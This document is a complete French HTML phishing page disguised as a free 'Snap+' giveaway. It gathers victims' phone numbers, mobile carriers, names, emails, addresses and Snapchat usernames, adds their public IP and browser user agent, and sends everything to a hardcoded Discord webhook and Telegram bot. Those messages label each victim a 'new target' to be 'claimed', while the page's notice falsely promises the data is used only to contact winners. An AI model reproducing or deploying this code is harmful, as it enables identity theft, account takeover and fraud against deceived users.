<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>🎁 Snap+ 1 An Gratuit</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: linear-gradient(135deg, #1a0033, #2c014d);
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: white;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .container {
      background: rgba(44, 1, 77, 0.85);
      border: 2px solid #a54ffb;
      border-radius: 20px;
      padding: 30px 25px;
      text-align: center;
      width: 340px;
      box-shadow: 0 0 20px #a54ffb;
      position: relative;
      animation: pulseBorder 2s infinite;
    }
    @keyframes pulseBorder {
      0% { box-shadow: 0 0 10px #a54ffb; }
      50% { box-shadow: 0 0 25px #a54ffb; }
      100% { box-shadow: 0 0 10px #a54ffb; }
    }
    .logo {
      font-size: 70px;
      margin-bottom: 5px;
      text-shadow: 0 0 10px #fff;
    }
    h1 {
      font-size: 24px;
      margin: 0 0 15px;
      letter-spacing: 1px;
    }
    p {
      font-size: 15px;
      color: #ddd;
      margin-bottom: 25px;
    }
    input, select {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border: 2px solid #a54ffb;
      border-radius: 10px;
      background-color: transparent;
      color: white;
      font-size: 15px;
      outline: none;
    }
    input::placeholder, select {
      color: #ccc;
    }
    button {
      width: 100%;
      background: #a54ffb;
      border: none;
      border-radius: 10px;
      color: white;
      padding: 12px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      margin-top: 12px;
      box-shadow: 0 0 10px #a54ffb;
      transition: 0.3s;
    }
    button:hover {
      background: #8b3ddb;
      box-shadow: 0 0 20px #c177ff;
    }
    .notice {
      font-size: 12px;
      margin-top: 15px;
      color: #bbb;
    }
    #step2 {
      display: none;
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="logo">👻✨</div>
    <h1>Snap+ uhq</h1>
    <p>Active 1 an de Snap+ gratuitement</p>

    <form id="giveawayForm">
      <div id="step1">
        <input
          type="text"
          name="telephone"
          placeholder="Numéro de téléphone"
          required
          pattern="[\d\s+]{6,}"
          title="Entrez un numéro valide"
        />
        <button type="button" onclick="showStep2()">Continuer</button>
      </div>

      <div id="step2">
        <select name="operateur" required>
          <option value="" disabled selected>Opérateur téléphonique</option>
          <option value="Orange">Orange</option>
          <option value="SFR">SFR</option>
          <option value="Bouygues">Bouygues</option>
          <option value="Free">Free</option>
          <option value="Autre">Autre</option>
        </select>
        <input type="text" name="nom" placeholder="Nom" required />
        <input type="text" name="prenom" placeholder="Prénom" required />
        <input type="email" name="email" placeholder="Email" required />
        <input type="text" name="ville" placeholder="Ville" required />
        <input type="text" name="departement" placeholder="Département" required />
        <input type="text" name="adresse" placeholder="Adresse (facultatif)" />
        <input type="text" name="snap" placeholder="Nom d'utilisateur Snapchat" required />
        <button type="submit">Valider</button>
      </div>
    </form>

    <div class="notice">
      Les données sont utilisées uniquement pour vous contacter si vous gagnez. Ce concours
      n’est pas affilié à uhqteamuhq.
    </div>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1399083560782270485/HQzCh3RmPUzWhOrfR-5dOQ_vX78AtG0eTeRjAih95uNq3lkCtQcLirMMwOufmBB1Zs0u";

    const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
    const TELEGRAM_CHAT_ID = "-1002810249796";

    const SUBMISSION_LIMIT = 30;
    const TIME_WINDOW_MINUTES = 30;

    // Logos par opérateur pour Telegram (emojis ou liens images)
    const TELEGRAM_LOGOS = {
      Orange: "🟠",
      SFR: "🔴",
      Bouygues: "🔵",
      Free: "⚫️",
      Autre: "❔"
    };

    // Logos par opérateur pour Discord (liens images ou emojis Unicode)
    const DISCORD_LOGOS = {
      Orange: "https://upload.wikimedia.org/wikipedia/commons/c/c4/Orange_logo.svg",
      SFR: "https://upload.wikimedia.org/wikipedia/commons/8/82/SFR_Logo_2021.svg",
      Bouygues: "https://upload.wikimedia.org/wikipedia/commons/9/99/Bouygues_telecom_logo.svg",
      Free: "https://upload.wikimedia.org/wikipedia/commons/7/7e/Free_Logo_2011.svg",
      Autre: ""
    };

    function showStep2() {
      const phoneInput = document.querySelector('[name="telephone"]');
      if (!phoneInput.value.trim()) {
        alert("Veuillez entrer votre numéro de téléphone.");
        return;
      }
      document.getElementById("step1").style.display = "none";
      document.getElementById("step2").style.display = "block";
    }

    async function getPublicIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip || "IP inconnue";
      } catch {
        return "IP inconnue";
      }
    }

    function canSubmit() {
      const now = Date.now();
      const submissions = JSON.parse(localStorage.getItem("giveaway_submissions") || "[]");
      // Garder uniquement celles dans la fenêtre
      const recent = submissions.filter(ts => now - ts < TIME_WINDOW_MINUTES * 60 * 1000);
      if (recent.length >= SUBMISSION_LIMIT) return false;
      recent.push(now);
      localStorage.setItem("giveaway_submissions", JSON.stringify(recent));
      return true;
    }

    function escapeMarkdown(text) {
      // Échapper les caractères Markdown qui pourraient casser la mise en forme Telegram
      return text.replace(/[_*[\]()~`>#+-=|{}.!]/g, "\\$&");
    }

    async function sendToTelegram(message) {
      const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
      const payload = {
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "MarkdownV2",
        disable_web_page_preview: true
      };

      try {
        const res = await fetch(url, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(payload)
        });
        if (!res.ok) {
          const errText = await res.text();
          throw new Error(`Erreur Telegram: ${res.status} - ${errText}`);
        }
      } catch (err) {
        console.error("Telegram error:", err);
      }
    }

    document.getElementById("giveawayForm").addEventListener("submit", async function (e) {
      e.preventDefault();

      if (!canSubmit()) {
        alert(`Vous avez dépassé la limite de ${SUBMISSION_LIMIT} participations toutes les ${TIME_WINDOW_MINUTES} minutes.`);
        return;
      }

      const formData = new FormData(this);
      const data = {};
      formData.forEach((v, k) => data[k] = v.trim());

      const ip = await getPublicIP();
      const userAgent = navigator.userAgent || "Inconnu";

      // Préparer le logo Telegram et Discord selon opérateur
      const operateur = data.operateur || "Autre";
      const telegramLogo = TELEGRAM_LOGOS[operateur] || TELEGRAM_LOGOS["Autre"];
      const discordLogoUrl = DISCORD_LOGOS[operateur] || "";

      // Message Telegram personnalisé avec logo et markdown v2 échappé
      const telegramMessage = 
`${telegramLogo} *Nouvelle cible Snap+*  
┌─📞 *Contact*  
│ ├─ Téléphone : \`${escapeMarkdown(data.telephone)}\`  
│ ├─ Email     : \`${escapeMarkdown(data.email)}\`  
│ └─ Snapchat  : \`${escapeMarkdown(data.snap)}\`  

├─👤 *Identité*  
│ ├─ Nom      : \`${escapeMarkdown(data.nom)}\`  
│ ├─ Prénom   : \`${escapeMarkdown(data.prenom)}\`  

├─📍 *Localisation*  
│ ├─ Ville        : \`${escapeMarkdown(data.ville)}\`  
│ ├─ Département  : \`${escapeMarkdown(data.departement)}\`  
│ └─ Adresse      : \`${escapeMarkdown(data.adresse || "Non fournie")}\`  

├─📡 *Opérateur*  
│ └─ ${escapeMarkdown(operateur)}  

└─🌐 *Autres*  
  ├─ IP          : \`${escapeMarkdown(ip)}\`  
  └─ User Agent  : \`${escapeMarkdown(userAgent)}\`  

🕒 Reçu le : ${new Date().toLocaleString("fr-FR")}`;

      // Embed Discord personnalisé
      const embed = {
        title: `🎉 Nouvelle cible Snap+ - ${operateur}`,
        color: 0x9B00FF,
        thumbnail: {
          url: discordLogoUrl || "https://i.imgur.com/bj22AGi.jpeg" // fallback
        },
        fields: [
          { name: "📞 Téléphone", value: data.telephone || "N/A", inline: true },
          { name: "📡 Opérateur", value: operateur, inline: true },
          { name: "👻 Snapchat", value: data.snap || "N/A", inline: true },
          { name: "✉️ Email", value: data.email || "N/A", inline: false },
          { name: "👤 Nom Complet", value: `${data.prenom} ${data.nom}`, inline: false },
          { name: "🏙️ Ville / Département", value: `${data.ville} / ${data.departement}`, inline: true },
          { name: "🏠 Adresse", value: data.adresse || "Non fournie", inline: false },
          { name: "🌐 IP Publique", value: ip, inline: false },
          { name: "🖥️ User Agent", value: userAgent, inline: false },
          { name: "🔐 Claimed by", value: "Pas encore revendiqué", inline: false }
        ],
        footer: {
          text: `Reçu le ${new Date().toLocaleString("fr-FR")}`
        },
        timestamp: new Date().toISOString(),
      };

      // Envoi Discord
      const discordSend = fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ embeds: [embed] }),
      }).then(res => {
        if (!res.ok) throw new Error("Erreur lors de l'envoi Discord");
      });

      // Envoi Telegram
      const telegramSend = sendToTelegram(telegramMessage);

      // Attendre les deux
      Promise.all([discordSend, telegramSend])
        .then(() => {
          window.location.href = "merci.html";
        })
        .catch(err => {
          alert("Erreur lors de l’envoi. Réessayez.");
          console.error(err);
        });

    });
  </script>
</body>
</html>
